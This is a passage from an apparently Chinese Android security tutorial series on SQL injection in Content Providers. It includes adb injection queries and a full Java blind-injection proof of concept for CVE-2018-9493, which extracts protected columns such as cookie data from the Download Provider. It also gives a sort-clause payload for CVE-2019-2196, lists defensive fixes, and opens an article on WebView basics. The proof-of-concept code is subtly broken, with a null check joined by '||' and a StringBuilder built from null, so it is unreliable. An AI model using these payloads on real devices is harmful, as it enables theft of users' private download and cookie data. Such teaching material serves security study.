alt=\"image-20220710165913808\"></p>\n<p>列出该app的表信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">run scanner.provider.sqltables -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/36.png\" alt=\"image-20220710165913808\"></p>\n<h3 id=\"4-安全防护\"><a href=\"#4-安全防护\" class=\"headerlink\" title=\"4.安全防护\"></a>4.安全防护</h3><p>（1）不需要导出的Content Provider组件，建议显示设置组件的“android:exported”属性为false</p>\n<p>（2）当组件可导出时，建议使用selectionArgs进行参数化组成SQL语句，例如：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">inputUserName</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;xxxx&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">inputPassword</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;xxxx&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">sql</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;select *from user where username=? and password=?&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">Cursor</span> <span class=\"variable\">cursor</span> <span class=\"operator\">=</span> db.rawQuery(sql,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;username,password&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>我们可以发现Content Provider上的sql漏洞核心原理和上面是一样的</p>\n<h2 id=\"五、Android-Download-Provider上sql注入漏洞\"><a href=\"#五、Android-Download-Provider上sql注入漏洞\" class=\"headerlink\" title=\"五、Android Download Provider上sql注入漏洞\"></a>五、Android Download Provider上sql注入漏洞</h2><p>Android Download Provider是用来进行下载的一个重要组件，Android提供了一套处理其他App下载请求的机制，例如浏览器的下载、邮件附件的下载、OTA升级包下载等。其中Download Manager用来处理下载请求，DownloadManager下载过程中，会将下载的数据和下载的状态插入ContentProvider中，完成下载后使用ContentProvider来提供下载内容给请求方APP。</p>\n<p>下载的流程关系图：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/38.png\" alt=\"image-20220710193502503\"></p>\n<h3 id=\"1-CVE-2018-9493-Download-Provider-SQL注入\"><a href=\"#1-CVE-2018-9493-Download-Provider-SQL注入\" class=\"headerlink\" title=\"1.CVE-2018-9493: Download Provider SQL注入\"></a>1.CVE-2018-9493: Download Provider SQL注入</h3><h4 id=\"（1）漏洞原理-3\"><a href=\"#（1）漏洞原理-3\" class=\"headerlink\" title=\"（1）漏洞原理\"></a>（1）漏洞原理</h4><p>通过利用SQL注入漏洞，未授予任何权限的恶意应用程序可以绕过当前实现的所有访问控制机制，从下载提供程序检索所有条目。 此外，被授予有限权限的应用程序（如Internet）也可以从不同的URI访问所有数据库内容。 对于Gmail、Chrome或Google Play Store等应用程序，从该提供程序检索的信息可能包括潜在的敏感信息，如文件名、描述、标题、路径、URL（在查询字符串中可能包含敏感参数）等。</p>\n<p>然而内部数据库中的某些列（例如<code>CookieData</code>）被认为是私有的，不能通过 Download Content Provider 直接访问，除非调用者具有不受限制的权限（URI 受<code>signatureOrSystem</code>访问级别保护）</p>\n<p>利用 where 表达式中的 SQL 注入，绕过<code>setStrict</code>过滤器，将允许我们从内部数据库中提取内容，包括任何受限制的列下载</p>\n<p>访问下载内容提供程序需要不同的权限，例如Internet或access_all_downloads，这取决于所请求的URI</p>\n<p>例如：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/37.png\" alt=\"image-20220710193502503\"></p>\n<p>但是可以针对下面URL，则无需任何权限：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">content:<span class=\"comment\">//downloads/public_downloads/#</span></span><br></pre></td></tr></table></figure>\n\n<p>我们可以在源码中查看对该URI的定义：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">sURIMatcher.addURI(<span class=\"string\">&quot;downloads&quot;</span>,</span><br><span class=\"line\">   Downloads.Impl.PUBLICLY_ACCESSIBLE_DOWNLOADS_URI_SEGMENT + <span class=\"string\">&quot;/#&quot;</span>,</span><br><span class=\"line\">   PUBLIC_DOWNLOAD_ID);</span><br></pre></td></tr></table></figure>\n\n<p>可以看出该URI，可以用于公共下载，但没有什么可以阻止攻击者注入SQL Selection子句来访问数据库中的任何行、列或表，包括受保护的列。这样我们就可以进行SQL注入</p>\n<p>总结：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">不需要权限：</span><br><span class=\"line\">content:<span class=\"comment\">//downloads/public_downloads/#</span></span><br><span class=\"line\">需要权限android.permission.INTERNET：</span><br><span class=\"line\">content:<span class=\"comment\">//downloads/my_downloads/</span></span><br><span class=\"line\">content:<span class=\"comment\">//downloads/my_downloads/#</span></span><br><span class=\"line\">content:<span class=\"comment\">//downloads/download/</span></span><br><span class=\"line\">content:<span class=\"comment\">//downloads/download/#</span></span><br></pre></td></tr></table></figure>\n\n<p>因此我们可以构造相关的sql注入语句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb shell content query <span class=\"comment\">--uri content://downloads/public_downloads/0 -- where &quot;1=1) OR (1=1&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>这里需要从Google Chrome下载任何文件（即PDF文件）或从Gmail下载任何附件，确保提供程序包含一些数据，然后使用该语句</p>\n<p>由于底层SQLiteQueryBuilder中强制使用严格模式，无法实现基于UNION语句的直接注入，但可以通过利用盲SQL注入提取所有信息：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb shell content query <span class=\"comment\">--uri content://downloads/public_downloads/0 -- where &quot;1=1) AND (_id=1 AND cookiedata LIKE &#x27;a%&#x27;) OR (1=1&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>也可以从request_headers表转储所有内容：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb shell content query <span class=\"comment\">--uri content://downloads/public_downloads/0 -- where &quot;1=1) AND (SELECT header FROM request_headers WHERE _id=1) LIKE &#x27;a%&#x27; OR (1=1&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>还可以使用盲SQL注入（如果启用此选项，则过程将稍微慢一些）来包含受限列，如UID、ETAG或CookieData</p>\n<h4 id=\"（2）漏洞复现-3\"><a href=\"#（2）漏洞复现-3\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>首先我们需要从google上下载一些数据</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/39.png\" alt=\"image-20220710194802806\"></p>\n<p>这里没有合适的案例，就不进行演示了</p>\n<p>然后我们编写Poc:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">dump</span><span class=\"params\">(<span class=\"type\">boolean</span> dumpProtectedColumns)</span> &#123;</span><br><span class=\"line\">       <span class=\"type\">ContentResolver</span> <span class=\"variable\">res</span> <span class=\"operator\">=</span> getContentResolver();</span><br><span class=\"line\">       <span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> Uri.parse(<span class=\"string\">&quot;content://downloads/public_downloads/#&quot;</span>);</span><br><span class=\"line\">       <span class=\"type\">Cursor</span> <span class=\"variable\">cur</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">       Log.e(<span class=\"string\">&quot;WindXaa&quot;</span>,<span class=\"string\">&quot;ERROR: The device does not appear to be vulnerable1&quot;</span>);</span><br><span class=\"line\">       <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">           <span class=\"comment\">//这里可以替换我们的sql注入构造语句</span></span><br><span class=\"line\">           cur = res.query(uri, <span class=\"literal\">null</span>, <span class=\"string\">&quot;1=1) OR (1=1&quot;</span>, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">       &#125; <span class=\"keyword\">catch</span> (IllegalArgumentException e) &#123;</span><br><span class=\"line\">           Log.e(<span class=\"string\">&quot;WindXaa&quot;</span>, <span class=\"string\">&quot;Error&quot;</span>, e);</span><br><span class=\"line\">           Log.e(<span class=\"string\">&quot;WindXaa&quot;</span>,<span class=\"string\">&quot;ERROR: The device does not appear to be vulnerable&quot;</span>);</span><br><span class=\"line\">           <span class=\"comment\">//return;</span></span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">           <span class=\"keyword\">if</span> (cur != <span class=\"literal\">null</span> || cur.getCount() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">               <span class=\"comment\">// Iterate all results and display some fields for each row from the downloads database</span></span><br><span class=\"line\">               <span class=\"keyword\">while</span> (cur.moveToNext()) &#123;</span><br><span class=\"line\">                   <span class=\"type\">int</span> <span class=\"variable\">rowId</span> <span class=\"operator\">=</span> cur.getInt(cur.getColumnIndex(<span class=\"string\">&quot;_id&quot;</span>));</span><br><span class=\"line\">                   <span class=\"type\">String</span> <span class=\"variable\">rowData</span> <span class=\"operator\">=</span> cur.getString(cur.getColumnIndex(<span class=\"string\">&quot;_data&quot;</span>));</span><br><span class=\"line\">                   <span class=\"type\">String</span> <span class=\"variable\">rowUri</span> <span class=\"operator\">=</span> cur.getString(cur.getColumnIndex(<span class=\"string\">&quot;uri&quot;</span>));</span><br><span class=\"line\">                   <span class=\"type\">String</span> <span class=\"variable\">rowTitle</span> <span class=\"operator\">=</span> cur.getString(cur.getColumnIndex(<span class=\"string\">&quot;title&quot;</span>));</span><br><span class=\"line\">                   <span class=\"type\">String</span> <span class=\"variable\">rowDescription</span> <span class=\"operator\">=</span> cur.getString(cur.getColumnIndex(<span class=\"string\">&quot;description&quot;</span>));</span><br><span class=\"line\">                   <span class=\"type\">String</span> <span class=\"variable\">string</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                   <span class=\"type\">StringBuilder</span> <span class=\"variable\">sb</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>(string);</span><br><span class=\"line\">                   sb.append(<span class=\"string\">&quot;DOWNLOAD ID &quot;</span>).append(rowId);</span><br><span class=\"line\">                   sb.append(<span class=\"string\">&quot;\\nData: &quot;</span>).append(rowData);</span><br><span class=\"line\">                   sb.append(<span class=\"string\">&quot;\\nUri: &quot;</span>).append(rowUri);</span><br><span class=\"line\">                   sb.append(<span class=\"string\">&quot;\\nTitle: &quot;</span>).append(rowTitle);</span><br><span class=\"line\">                   sb.append(<span class=\"string\">&quot;\\nDescription: &quot;</span>).append(rowDescription);</span><br><span class=\"line\"></span><br><span class=\"line\">                   <span class=\"keyword\">if</span> (dumpProtectedColumns) &#123;</span><br><span class=\"line\">                       <span class=\"type\">int</span> <span class=\"variable\">uid</span> <span class=\"operator\">=</span> binarySearch(rowId, <span class=\"string\">&quot;uid&quot;</span>);</span><br><span class=\"line\">                       sb.append(<span class=\"string\">&quot;\\nUID: &quot;</span>).append(uid);</span><br><span class=\"line\"></span><br><span class=\"line\">                       dumpColumn(rowId, <span class=\"string\">&quot;CookieData&quot;</span>, sb);</span><br><span class=\"line\">                       dumpColumn(rowId, <span class=\"string\">&quot;ETag&quot;</span>, sb);</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                   Log.w(<span class=\"string\">&quot;WindXaa&quot;</span>,sb.toString());</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">               Log.e(<span class=\"string\">&quot;WindXaa&quot;</span>,<span class=\"string\">&quot;\\n\\nDUMP FINISHED&quot;</span>);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">           <span class=\"keyword\">if</span> (cur != <span class=\"literal\">null</span>)</span><br><span class=\"line\">               cur.close();</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">dumpColumn</span><span class=\"params\">(<span class=\"type\">int</span> rowId, String columnName, StringBuilder sb)</span> &#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (isTrueCondition(rowId, <span class=\"string\">&quot;length(&quot;</span> + columnName + <span class=\"string\">&quot;) &gt; 0&quot;</span>)) &#123;</span><br><span class=\"line\">           <span class=\"type\">int</span> <span class=\"variable\">len</span> <span class=\"operator\">=</span> binarySearch(rowId, <span class=\"string\">&quot;length(&quot;</span> + columnName + <span class=\"string\">&quot;)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">           sb.append(<span class=\"string\">&quot;\\n&quot;</span> + columnName + <span class=\"string\">&quot;: &quot;</span>);</span><br><span class=\"line\">           <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>; i &lt;= len; i++) &#123;</span><br><span class=\"line\">               <span class=\"type\">int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> binarySearch(rowId, <span class=\"string\">&quot;unicode(substr(&quot;</span> + columnName + <span class=\"string\">&quot;,&quot;</span> + i + <span class=\"string\">&quot;,1))&quot;</span>);</span><br><span class=\"line\">               <span class=\"type\">String</span> <span class=\"variable\">newChar</span> <span class=\"operator\">=</span> Character.toString((<span class=\"type\">char</span>) c);</span><br><span class=\"line\">               sb.append(newChar);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"type\">int</span> <span class=\"title function_\">binarySearch</span><span class=\"params\">(<span class=\"type\">int</span> id, String sqlExpression)</span> &#123;</span><br><span class=\"line\">       <span class=\"type\">int</span> <span class=\"variable\">min</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">       <span class=\"type\">int</span> <span class=\"variable\">max</span> <span class=\"operator\">=</span> <span class=\"number\">20000</span>;</span><br><span class=\"line\">       <span class=\"type\">int</span> <span class=\"variable\">mid</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">while</span> (min + <span class=\"number\">1</span> &lt; max) &#123;</span><br><span class=\"line\">           mid = (<span class=\"type\">int</span>) Math.floor((<span class=\"type\">double</span>) (max + min) / <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"keyword\">if</span> (isTrueCondition(id, sqlExpression + <span class=\"string\">&quot;&gt;&quot;</span> + mid))</span><br><span class=\"line\">               min = mid;</span><br><span class=\"line\">           <span class=\"keyword\">else</span></span><br><span class=\"line\">               max = mid;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">if</span> ((mid == max) &amp;&amp; isTrueCondition(id, sqlExpression + <span class=\"string\">&quot;=&quot;</span> + mid))</span><br><span class=\"line\">           <span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">       <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (isTrueCondition(id, sqlExpression + <span class=\"string\">&quot;=&quot;</span> + (mid + <span class=\"number\">1</span>))) <span class=\"comment\">// Extra check</span></span><br><span class=\"line\">           <span class=\"keyword\">return</span> mid + <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isTrueCondition</span><span class=\"params\">(<span class=\"type\">int</span> rowId, String sqlCondition)</span> &#123;</span><br><span class=\"line\">       <span class=\"type\">ContentResolver</span> <span class=\"variable\">res</span> <span class=\"operator\">=</span> getContentResolver();</span><br><span class=\"line\">       <span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> Uri.parse(<span class=\"string\">&quot;content://downloads/public_downloads/0&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"type\">Cursor</span> <span class=\"variable\">cur</span> <span class=\"operator\">=</span> res.query(uri, <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;_id&quot;</span>&#125;, <span class=\"string\">&quot;_id=&quot;</span> + rowId + <span class=\"string\">&quot;) and (&quot;</span> +</span><br><span class=\"line\">               sqlCondition + <span class=\"string\">&quot;) or (1=1&quot;</span>, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">           <span class=\"keyword\">return</span> (cur != <span class=\"literal\">null</span> &amp;&amp; cur.getCount() &gt; <span class=\"number\">0</span>);</span><br><span class=\"line\">       &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">           <span class=\"keyword\">if</span> (cur != <span class=\"literal\">null</span>)</span><br><span class=\"line\">               cur.close();</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>预期效果显示（这里由于没找到合适案例，使用官方图片展示效果）：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/40.png\" alt=\"image-20220710195237128\"></p>\n<h4 id=\"（3）安全防护\"><a href=\"#（3）安全防护\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">如果它没有破坏任何功能，请考虑添加被删除的行：</span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">query</span><span class=\"params\">(<span class=\"keyword\">final</span> Uri uri, String[] projection,</span></span><br><span class=\"line\"><span class=\"params\">    <span class=\"keyword\">final</span> String selection, <span class=\"keyword\">final</span> String[] selectionArgs,</span></span><br><span class=\"line\"><span class=\"params\">    <span class=\"keyword\">final</span> String sort)</span> &#123;</span><br><span class=\"line\">\tHelpers.validateSelection(selection, sAppReadableColumnsSet);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Android-Download-Provider上的SQL注入——sort参数（CVE-2019-2196）\"><a href=\"#2-Android-Download-Provider上的SQL注入——sort参数（CVE-2019-2196）\" class=\"headerlink\" title=\"2.Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）\"></a>2.Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）</h3><h4 id=\"（1）漏洞原理-4\"><a href=\"#（1）漏洞原理-4\" class=\"headerlink\" title=\"（1）漏洞原理\"></a>（1）漏洞原理</h4><p>同样是针对Download Provider，因为被授予<code>android.permission.INTERNET</code>权限的恶意应用可以在<code>query()</code>方法的<code>sort</code>参数（<code>ORDER BY</code>子句）中附加一个包含子查询语句的<code>LIMIT</code>子句，实施SQL注入攻击，从而检索Download Provider内部数据库的所有条目。</p>\n<h4 id=\"（2）漏洞复现-4\"><a href=\"#（2）漏洞复现-4\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>可以构造sql注入语句：</p>\n<p><code>sort</code>参数传入的值是<code>ORDER BY</code>子句后拼接的内容，为了利用此漏洞，可以在<code>sort</code>参数处构造：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">columnName</span><br><span class=\"line\">limit</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"title function_\">when</span> <span class=\"params\">(condition)</span> then <span class=\"number\">1</span> <span class=\"keyword\">else</span> <span class=\"number\">0</span> end</span><br><span class=\"line\">例如：</span><br><span class=\"line\">_id limit <span class=\"keyword\">case</span> <span class=\"title function_\">when</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">    (select count(*)</span> from downloads)&gt;<span class=\"number\">0</span></span><br><span class=\"line\">)</span><br><span class=\"line\">then <span class=\"number\">1</span> <span class=\"keyword\">else</span> <span class=\"number\">0</span> end</span><br></pre></td></tr></table></figure>\n\n<p>这里详细的复现过程可以参考文章：<a href=\"https://zhuanlan.zhihu.com/p/367365614\">Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）</a></p>\n<h4 id=\"（3）安全防护-1\"><a href=\"#（3）安全防护-1\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><p>确保执行数据库操作前合理校验query()方法的sort参数。例如，确保sort参数不包含注入了LIMIT子句和潜在的恶意子查询语句的恶意payload，或者执行更严格的校验，比如要求参数仅包含以逗号分隔的现有数据列列表和字符串“asc”或“desc”。</p>\n<p>DownloadProvider.java文件添加代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> Cursor <span class=\"title function_\">query</span><span class=\"params\">(<span class=\"keyword\">final</span> Uri uri, String[] projection,</span></span><br><span class=\"line\"><span class=\"params\">         <span class=\"keyword\">final</span> String selection, <span class=\"keyword\">final</span> String[] selectionArgs,</span></span><br><span class=\"line\"><span class=\"params\">         <span class=\"keyword\">final</span> String sort)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (shouldRestrictVisibility()) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (sort != <span class=\"literal\">null</span> &amp;&amp; sort.toLowerCase(Locale.ENGLISH).contains(<span class=\"string\">&quot;limit&quot;</span>))</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalArgumentException</span>(<span class=\"string\">&quot;invalid sort&quot;</span>);</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"六、总结\"><a href=\"#六、总结\" class=\"headerlink\" title=\"六、总结\"></a>六、总结</h2><p>本文通过总结和学习，初步的将讲解了Android平台APP上的常见的Sql注入的方式，并使用一些案例进行了一一的列举，文中一部分漏洞没有找到合适的案例，大家可以参考对应作者的博客，后续相关的实验材料上传github和知识星球</p>\n<p>github网址：<a href=\"https://github.com/WindXaa/Android-Vulnerability-Mining\">WindXaa</a></p>\n<h2 id=\"参考文献：\"><a href=\"#参考文献：\" class=\"headerlink\" title=\"参考文献：\"></a>参考文献：</h2><p>sql注入漏洞：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/li-xin-yi/SQL-inject-demo</span><br><span class=\"line\">https://security-summer-labs.readthedocs.io/en/latest/lab8/readme.html#task-1-sql-injection-attack-on-select-statement</span><br><span class=\"line\">https://chowdera.com/2022/02/202202060538187242.html</span><br><span class=\"line\">https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/</span><br><span class=\"line\">https://cloud.tencent.com/developer/article/1580824</span><br></pre></td></tr></table></figure>\n\n<p>DownLoad Provider漏洞：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://zhuanlan.zhihu.com/p/367365614</span><br><span class=\"line\">https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</span><br><span class=\"line\">https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（20）——Webview漏洞详解","url":"/2023/02/14/bug0020/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>快半个月没有更新文章了，最近不少朋友催更了，今天我们进入Android APP漏洞之战系列文章中的一个重要篇幅——WebView漏洞，我们都知道在当下App漏洞中，WebView漏洞的占比是十分巨大的，各种类型的漏洞问题层出不穷，这篇文章就带着大家一起揭开WebView漏洞神奇的面纱。</p>\n<span id=\"more\"></span>\n<p>本文第二节讲述WebView的基本知识</p>\n<p>本文第三节讲述WebView的漏洞面</p>\n<p>本文第四节进行了漏洞原理介绍和漏洞复现</p>\n<p>总结：本文从WebView开发出发，从0开始进行漏洞的讲解和复现，花了几天时间，列举了WebView中的20多种漏洞案例，并手动复现了其中十余种案例，希望用这篇万字长文介绍WebView漏洞的基本发展。</p>\n<h2 id=\"二、基础知识\"><a href=\"#二、基础知识\" class=\"headerlink\" title=\"二、基础知识\"></a>二、基础知识</h2><h3 id=\"1-WebView基础\"><a href=\"#1-WebView基础\" class=\"headerlink\" title=\"1.WebView基础\"></a>1.WebView基础</h3><h4 id=\"（1）WebView概述\"><a href=\"#（1）WebView概述\" class=\"headerlink\" title=\"（1）WebView概述\"></a>（1）WebView概述</h4><p>Android WebView在Android平台上是一个特殊的View，它能用来显示网页，这个WebView类可以被用来在app中仅仅显示一张在线的网页，还可以用来开发浏览器。</p>\n<p>WebView内部实现是采用渲染引擎(WebKit)来展示view的内容，提供网页前进后退、网页放大、缩小、搜索等功能。Android WebView 在低版本和高版本采用了不同的 webkit 版本内核，在 4.4 版本后使用 Chrome 内核。</p>\n<h4 id=\"（2）WebView作用\"><a href=\"#（2）WebView作用\" class=\"headerlink\" title=\"（2）WebView作用\"></a>（2）WebView作用</h4><ul>\n<li>显示和渲染Web页面</li>\n<li>直接使用html文件（网络上或本地assets中）作布局</li>\n<li>可和JavaScript交互调用</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">WebView控件功能强大，除了具有一般View的属性和设置外，还可以对url请求、页面加载、渲染、页面交互进行强大的处理。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）WebView基础使用\"><a href=\"#（3）WebView基础使用\" class=\"headerlink\" title=\"（3）WebView基础使用\"></a>（3）WebView基础使用</h4><h5 id=\"lt-1-gt-本地加载\"><a href=\"#lt-1-gt-本地加载\" class=\"headerlink\" title=\"&lt;1&gt;本地加载\"></a>&lt;1&gt;本地加载</h5><p>Web最简单显示网页内容，基本步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.在布局文件中添加WebView控件；</span><br><span class=\"line\">2.在代码中让WebView控件加载显示网页。</span><br></pre></td></tr></table></figure>\n\n<p>具体操作：</p>\n<p>首先，我们在布局文件中来添加WebView控件，如下</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">WebView</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:id</span>=<span class=\"string\">&quot;@+id/Wind_webview&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:layout_width</span>=<span class=\"string\">&quot;match_parent&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:layout_height</span>=<span class=\"string\">&quot;match_parent&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/1.png\" alt=\"image-20220726171401583\"></p>\n<p>然后我们在代码中让WebView控件加载显示网页，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//获得控件</span></span><br><span class=\"line\">       <span class=\"type\">WebView</span> <span class=\"variable\">webView</span> <span class=\"operator\">=</span> (WebView) findViewById(R.id.Wind_webview);</span><br><span class=\"line\">       <span class=\"comment\">//访问网页</span></span><br><span class=\"line\">       webView.loadUrl(<span class=\"string\">&quot;http://www.baidu.com&quot;</span>);</span><br><span class=\"line\">       <span class=\"comment\">//系统默认会通过手机浏览器打开网页，为了能够直接通过WebView显示网页，则必须设置</span></span><br><span class=\"line\">       webView.setWebViewClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebViewClient</span>()&#123;</span><br><span class=\"line\">           <span class=\"meta\">@Override</span></span><br><span class=\"line\">           <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">shouldOverrideUrlLoading</span><span class=\"params\">(WebView view, String url)</span> &#123;</span><br><span class=\"line\">               <span class=\"comment\">//使用WebView加载显示url</span></span><br><span class=\"line\">               view.loadUrl(url);</span><br><span class=\"line\">               <span class=\"comment\">//返回true</span></span><br><span class=\"line\">               <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/2.png\" alt=\"image-20220726171554052\"></p>\n<p>最后我们在配置文件中添加网络权限：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 添加网络权限 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img 